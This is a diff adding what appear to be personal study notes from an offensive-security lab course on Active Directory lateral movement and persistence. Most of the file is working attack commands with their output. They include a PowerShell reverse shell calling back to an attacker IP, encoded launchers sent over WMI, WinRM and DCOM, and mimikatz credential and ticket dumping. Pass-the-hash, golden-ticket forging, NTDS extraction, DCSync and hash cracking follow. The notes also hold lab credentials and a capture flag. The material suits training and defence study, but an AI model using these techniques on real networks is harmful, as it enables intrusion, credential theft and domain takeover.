@@ -1,0 +1,326 @@
+Lateral Movement in Active Directory
+
+Active Directory Lateral Movement Techniques
+
+WMI and WinRM
+
+WMI:
+(RPC port 135)
+
+remote start calculator:
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+
+powershell method:
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+$command = 'calc';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+reverse shell:
+import sys
+import base64
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmd)
+
+python3 encode.py
+
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+nc -lnvp 443
+hostname
+whoami
+
+------
+WinRM:
+(WS-Management protocol, exchange XML over http/https, port 5986, 5985)
+
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+
+reverse shell:
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+nc -lnvp 443
+
+powershell remoting method:
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+
+Enter-PSSession 1
+whoami
+hostname
+
+--------
+PsExec:
+(Administrators local group, ADMIN$, file sharing)
+
+c:\tools\sysinternalssuite
+.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+hostname
+whoami
+
+--------
+Pass the Hash (PtH, NTLM hash):
+(SMB, file sharing, ADMIN$ available)
+
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+hostname
+whoami
+
+------------
+Overpass the Hash:
+(abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS))
+
+run a process, run as a different user (right click)
+
+privilege::debug
+sekurlsa::logonpasswords
+* NTLM     : 369def79d8372408bf6e93364cc93075
+
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+klist
+
+net use \\files04
+klist
+#0>     Client: jen @ CORP.COM
+        Server: krbtgt/CORP.COM @ CORP.COM
+#1>     Client: jen @ CORP.COM
+        Server: cifs/files04 @ CORP.COM
+
+cd C:\tools\SysinternalsSuite\
+.\PsExec.exe \\files04 cmd
+whoami
+hostname
+
+----------
+Labs 2. Start VM Group 2 and try to execute the overpass the hash technique to move laterally to web04 to get the flag located on the Administrator's desktop. To do so, connect to CLIENT76 via RDP as the offsec user and use the NTLM hash obtained in a previous Module
+
+attacker 192.168.49.64
+client76 192.168.64.76 offsec/lab
+web04 192.168.64.72
+
+administrator NTLM hash 2892D26CDF84D7A70E2EB3B9F05C425E
+
+xfreerdp3 /v:192.168.64.76 /u:offsec /p:lab
+
+c:\tools
+mimikatz
+sekurlsa::pth /user:administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
+
+user    : administrator
+domain  : corp.com
+program : powershell
+impers. : no
+NTLM    : 2892d26cdf84d7a70e2eb3b9f05c425e
+  |  PID  6704
+  |  TID  6700
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+ERROR kuhl_m_sekurlsa_pth_luid ; memory handle is not KULL_M_MEMORY_TYPE_PROCESS
+
+net use \\web04
+need password ?
+
+klist (empty)
+
+----------
+Pass the Ticket
+(TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service (SPN))
+
+privilege::debug
+sekurlsa::tickets /export
+(parsed the LSASS process space in memory for any TGT/TGS)
+
+dir *.kirbi
+-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+klist
+#0>     Client: dave @ CORP.COM
+        Server: cifs/web04 @ CORP.COM
+
+ls \\web04\backup
+
+-------
+Labs 1. Start VM Group 1 and try to execute the pass the ticket technique as illustrated in this section by first logging in to CLIENT76 as jen. Try to move laterally to web04 to get the flag located in the shared folder
+
+attacker 192.168.49.64
+client76 192.168.64.76 CORP\jen / Nexus123!
+web04 192.168.64.72
+
+xfreerdp3 /v:192.168.64.76 /u:jen /p:Nexus123!
+
+c:\tools
+mimikatz
+privilege::debug
+sekurlsa::tickets /export
+
+c:\tools
+dir *.kirbi
+02/10/2026  09:39 PM             1,577 [0;12f0c8]-0-0-40810000-dave@cifs-web04.kirbi
+
+kerberos::ptt [0;12f0c8]-0-0-40810000-dave@cifs-web04.kirbi
+* File: '[0;12f0c8]-0-0-40810000-dave@cifs-web04.kirbi': OK
+
+klist
+Current LogonId is 0:0xda1a0
+#0>     Client: jen @ CORP.COM
+        Server: krbtgt/CORP.COM @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/10/2026 21:44:59 (local)
+        End Time:   2/11/2026 7:44:59 (local)
+        Renew Time: 2/17/2026 21:44:59 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: DC1.corp.com
+
+#1>     Client: jen @ CORP.COM
+        Server: cifs/web04 @ CORP.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/10/2026 21:44:59 (local)
+        End Time:   2/11/2026 7:44:59 (local)
+        Renew Time: 2/17/2026 21:44:59 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC1.corp.com
+
+only jen's ticket, not dave ticket !
+
+PS C:\Tools> ls \\web04\backup
+
+net view \\web04\backup
+Access is denied.
+
+-------
+DCOM
+(create component that interact with each other, extended to DCOM, RPC TCP port 135, local administrator access SCM, abuse DCOM MMC)
+
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+tasklist | findstr "calc"
+
+reverse shell:
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+nc -lnvp 443
+whoami
+hostname
+
+-----------
+Active Directory Persistence
+
+Golden Ticket
+(when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt, If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources)
+
+privilege::debug
+lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
+User : krbtgt
+LM   :
+NTLM : 1693c6cefafffc7af11ef34d1c788f47
+
+kerberos::purge
+
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+misc::cmd
+User Id   : 500
+Groups Id : *513 512 520 518 519  
+Golden ticket for 'jen @ corp.com' successfully submitted for current session
+
+PsExec.exe \\dc1 cmd.exe
+ipconfig
+whoami
+whoami /groups
+CORP\Domain Admins  
+
+(If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked)
+
+--------
+Shadow Copies
+(Volume Shadow Service (VSS), Microsoft backup technology that allows the creation of snapshots of files or entire volumes, vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline)
+
+vshadow.exe -nw -p  C:
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+
+---------
+Capstone Exercise: Start VM Group 2 and try to execute the dcsync technique and get access to dc1 in order to get the flag located on the administrator's desktop. To do so, log in via RDP as the jeffadmin and perform dcsync against the domain Administrator user to obtain its NTLM hash
+
+attacker 192.168.49.64
+client74 192.168.64.74 CORP\jeffadmin / BrouhahaTungPerorateBroom2023!
+dc01 192.168.64.70 CORP\jeffadmin / BrouhahaTungPerorateBroom2023!
+
+xfreerdp3 /v:192.168.64.74 /u:jeffadmin /p:BrouhahaTungPerorateBroom2023!
+xfreerdp3 /v:192.168.64.70 /u:jeffadmin /p:BrouhahaTungPerorateBroom2023!
+
+cd C:\Tools\
+.\mimikatz.exe
+lsadump::dcsync /user:corp\administrator
+SAM Username         : Administrator
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-500
+Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+
+sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
+hashcat -m 1000 admin.ntlm.hash /usr/share/wordlists/rockyou.txt --force
+2892d26cdf84d7a70e2eb3b9f05c425e:lab 
+
+runas /user:administrator "cmd.exe"
+lab
+C:\Users\Administrator\Desktop\flag.txt
+OS{2b6cc586adf541443cdeb4ebed46cd65}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
